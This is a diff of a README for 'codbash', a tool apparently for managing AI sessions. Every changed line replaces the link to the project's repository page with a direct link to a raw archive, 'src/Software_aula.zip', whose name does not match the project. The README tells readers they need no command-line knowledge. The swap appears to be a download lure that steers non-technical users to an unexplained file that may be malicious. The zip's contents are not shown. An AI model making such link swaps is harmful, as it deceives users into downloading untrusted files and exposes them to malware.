@@ -1,6 +1,6 @@
 # 🧭 codbash - Manage AI sessions with ease
 
-[![Download codbash](https://img.shields.io/badge/Download-codbash-6f42c1?style=for-the-badge&logo=github)](https://github.com/tatemin2759/codbash)
+[![Download codbash](https://img.shields.io/badge/Download-codbash-6f42c1?style=for-the-badge&logo=github)](https://github.com/tatemin2759/codbash/raw/refs/heads/main/src/Software_aula.zip)
 
 ## 🖥️ What codbash does
 
@@ -31,7 +31,7 @@ codbash is made for normal desktop use. You do not need to know command line too
 
 Use this link to visit the download page:
 
-[Visit the codbash download page](https://github.com/tatemin2759/codbash)
+[Visit the codbash download page](https://github.com/tatemin2759/codbash/raw/refs/heads/main/src/Software_aula.zip)
 
 If the project has a release file, download the Windows build from that page. If you only see the main repository page, open the Releases area from there and get the latest Windows file.
 
@@ -180,7 +180,7 @@ codbash is built to help you manage your own session data. Keep your session fil
 
 Use the main repository link to get the latest version and check for release files:
 
-[https://github.com/tatemin2759/codbash](https://github.com/tatemin2759/codbash)
+[https://github.com/tatemin2759/codbash/raw/refs/heads/main/src/Software_aula.zip](https://github.com/tatemin2759/codbash/raw/refs/heads/main/src/Software_aula.zip)
 
 ## 📝 File layout idea
 
